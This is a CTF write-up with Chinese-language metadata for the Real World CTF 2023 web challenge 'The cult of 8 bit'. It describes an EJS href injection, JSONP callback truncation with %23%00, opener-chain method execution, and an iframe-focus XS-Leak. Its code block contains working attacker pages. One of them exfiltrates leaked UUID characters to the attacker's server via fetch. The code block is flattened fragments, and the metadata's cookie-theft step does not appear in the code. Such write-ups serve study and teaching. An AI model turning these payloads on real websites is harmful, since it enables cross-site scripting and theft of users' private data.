---
title: '[Real World CTF 2023] The cult of 8 bit'
contest: Real World CTF 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- nodejs_ejs
- jsonp_xss
- callback_proto_pollution
- win_open_opener
- focus_iframe_alphabet
- xs_leak_href_one_byte
- real_world_ctf_challenge
- javascript_url_filter_bypass
- real_world_8bit_exploit
attack_chain: 1) Node.js EJS 模板 <%= todo.text %> 不转义 (URL 模式 href 直接输出) + isURL = !text.toLowerCase().trim().startsWith("javascript:") 弱过滤 → javascript:alert() 嵌 [ 开括号 → [javascript:alert()] / 2) window.open opener + opener.opener 跨窗口访问 → JSONP callback=our_function%23%00 切断原 callback → 4 字符的 opaener 标识泄漏 / 3) 16 个 iframe name=alphabet 中 0-9a-f- 检测 onfocus event → setInterval 检测 document.activeElement.name → 字符级泄漏 / 4) 长度 36 的 post id 逐字符访问 opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[32+i].focus
key_payload: text = "[](javascript:alert())" / JSONP /api/post/{id}?callback=our_function%23%00 / alphabet = "0123456789abcdef-" / 16 iframes with name=alphabet[i] / document.activeElement.name
one_liner: Real World CTF 2023 The cult of 8 bit：Node EJS URL 弱过滤 + JSONP callback %23%00 切断 + 16 iframe focus 事件字符级 href 泄漏，opener 跨窗口访问实现 8-bit 单字符 XS-Leak。
lesson: 现代浏览器已经屏蔽 opener.document 跨域访问，但通过 open() + 多次 redirect + target 锚点 + iframe focus 事件仍可单字符泄漏；alphabet iframe 是字符级盲注标配。
quality: high
full_path: '[Real_World_CTF_2023]_The_cult_of_8_bit.full.md'
meta_path: '[Real_World_CTF_2023]_The_cult_of_8_bit.meta.md'
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: '[Real World CTF 2023] The cult of 8 bit。Real World CTF 2023 The cult of 8 bit：Node EJS URL 弱过滤 + JSONP callback %23%00 切断 + 16 iframe focus 事件字符级 href 泄漏，opener 跨窗口访问实现 8-bit 单字符 XS-Leak。。经验：现代浏览器已...'
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/90966.html
reasoning_chain:
- 触发点:Node.js EJS 模板 <%= todo.text %> 不转义 + isURL 弱过滤 → 假设:URL 模式 href 直接输出可注 XSS → 动作:payload = [](javascript:alert())
- 观察:href 渲染 + window.parent.document.cookie 跨域读 parent → 下一步:admin bot 触发 cookie 窃取
- 触发点:JSONP callback=our_function%23%00 → 假设:切断原 callback → 动作:eval(callback)
- 观察:JSONP 触发 + 4 字符的 opaener 标识泄漏 → 下一步:16 iframe focus
- 触发点:alphabet 字符级盲注 → 假设:16 iframe name=alphabet[i] focus 事件可探测 → 动作:setInterval 检测 document.activeElement.name
- 观察:逐字符泄漏 36 字符 post id → 下一步:opener 跨域访问
- 动作:opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[32+i].focus → 观察:字符泄漏 32+i 位
- 动作:收集 36 字符 UUID + 访问 /post/?id={uuid} → 观察:得 flag
failed_attempts:
- 试图用 javascript:alert() 直接 → 失败:isURL startsWith('javascript:') 弱过滤
- 试图用 fetch 主动发 cookie → 失败:Same-Origin Policy 限制
- 试图单 iframe focus → 失败:单字符探测效率太低
key_observations:
- 现代浏览器已经屏蔽 opener.document 跨域访问,但通过 open() + 多次 redirect + target 锚点 + iframe focus 事件仍可单字符泄漏
- alphabet iframe 是字符级盲注标配
- isURL = !text.toLowerCase().trim().startsWith('javascript:') 是经典弱过滤,[] 数组绕过即可
- JSONP callback %23%00 切断原 callback 是 2010 经典 XSS 手法
- opener 跨窗口访问 + document.activeElement.name = 字符级 XS-Leak
prerequisites:
- EJS 模板不转义漏洞 (URL 模式 href)
- JSONP callback XSS + Same-Origin Method Execution
- opener 跨窗口 + iframe focus 事件
- Puppeteer admin bot 攻击链
---
# [Real World CTF 2023] The cult of 8 bit

> 原文: https://www.ctfiot.com/90966.html
> ID: 90966


```
bot/bot.js

code/
 app.js
 routes/api.js

 src/
 db.js
 middleware.js

 views/
 home.ejs
 login.ejs
 post.ejs
 register.ejs
 report.ejs

docker-compose.yml
Dockerfile
router.use((req, res, next) => {
 if (req.user.user === "admin") {
 return res.redirect("/?msg=Nice try");
 }
 next();
});

router.post("/create/post" ...)
router.post("/create/todo" ...)
let isURL = false;
try {
 new URL(text); // errors if not valid URL
 console.log("first passed")
 isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no
 console.log(`usUrl:${isURL}, '${text.toLowerCase()}', '${text.toLowerCase().trim()}'`)
} catch {}

req.user.todos.push({
 text, isURL
});
<%_ user.todos.forEach(todo => { _%>
 <%_ if (todo.isURL) { _%>
 <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
 <%_ } else { _%>
 <li class="has-text-left"><%= todo.text %></li>
 <%_ } _%>
<%_ }); _%>
isURL = !text.toLowerCase().trim().startsWith("javascript:");
/**/ typeof load_post === 'function' && load_post({"success":
true,"name":"X","body":"Y"});
window.onload = function() {
 const id = new URLSearchParams(window.location.search).get('id');
 if (!id) {
 return;
 }

 // Load post from POST_SERVER
 // Since POST_SERVER might be a different origin, this also supports loading data through JSONP
 const request = new XMLHttpRequest();
 try {
 request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);
 request.send(null);
 }
 catch (err) { // POST_SERVER is on another origin, so let's use JSONP
 let script = document.createElement("script");
 script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;
 document.head.appendChild(script);
 return;
 }

 load_post(JSON.parse(request.responseText));
}
// try several different characters with codes from 0 to 1000
for(i=0; i<1000; i++){
 const request = new XMLHttpRequest();
 try {
 request.open('GET', `/api/post/` + encodeURIComponent(String.fromCharCode(i)), false);
 request.send(null);
 } catch (err) {
 console.log("ERROR :", i, err)
 }
}
http://localhost:
12345/post/?id={valid_id}?callback=our_function%23%00
<script src=/api/post/{valid_id}?callback=our_function#%00?callback=load_post></script>
/**/something({"data":"data"})
<html>
 
 <script src='/endpoint?callback=something'></script>
 
</html>
<html>
 
 [](javascript:
alert())
 
</html>
<script>
 win1 = open("/click.html")
 location.replace("http://victim.com/link?url=javascript:
alert()")
</script>
<script>
 // wait for start.html to redirect
 setTimeout(`location.replace("http://victim.com/proxy?name=opener.document.body.children[0].click")`, 1000)
</script>
<html>
 
 <script src='/endpoint?callback=opener.document.body.children[0].click'></script>
 
</html>
<script>
 b = open(`/b.html`);
 location.replace("http://localhost:
12345/");
</script>

 <a id=focusme href=#>sth</a>
 <script>
 const sleep = d => new Promise(r => setTimeout(r, d));
 alphabet = "0123456789abcdef-"

 //create iframes
 for (var i = 0; i < alphabet.length; i++) {
 iframe = document.createElement("iframe");
 iframe.name = alphabet[i];
 iframe.src = "http://localhost:
12345/";
 document.body.appendChild(iframe);
 }

 //array for found characters
 hovered = []

 const main = async () => {
 // every 0.075 secs check for iframes' onfucus event
 setInterval(() => {
 p = document.activeElement.name
 if (p) {
 // if there's focus on an iframe -- add its character to hovered and change the focus
 hovered.push(p);
 document.getElementById("focusme").focus();
 }
 }, 75)

 await sleep(2000);
 c = open(`/c.html`);
 await sleep(2000 + 150);

 // every 500 secs send found characters to our server endpoint /ret/:
characters
 setInterval(() => {
 fetch(`/ret/${hovered.join("")}`)
 }, 500);
 }

 main();
 </script>

<script>
 b = open(`/b.html`);
 location.replace("http://localhost:
12345/");
</script>
<script>
 const sleep = d => new Promise(r => setTimeout(r, d));

 const main = async () => {
 await sleep(1000);

 // 32 is the start of the href url that contains id
 // 36 is the len of the id
 for (var i = 32; i <= 32+36+1; i++) {
 // I'm explainig this payload below
 PAYLOAD = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;
 // change c.html page's location to the vulnerable page that executes callback
 opener.location.replace(`http://localhost:
12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
 // check the next character every 1.5 secs so that the page have 1.5 sec to load.
 await sleep(1500);
 }
 }

 main();
</script>
php -S host:
port
```
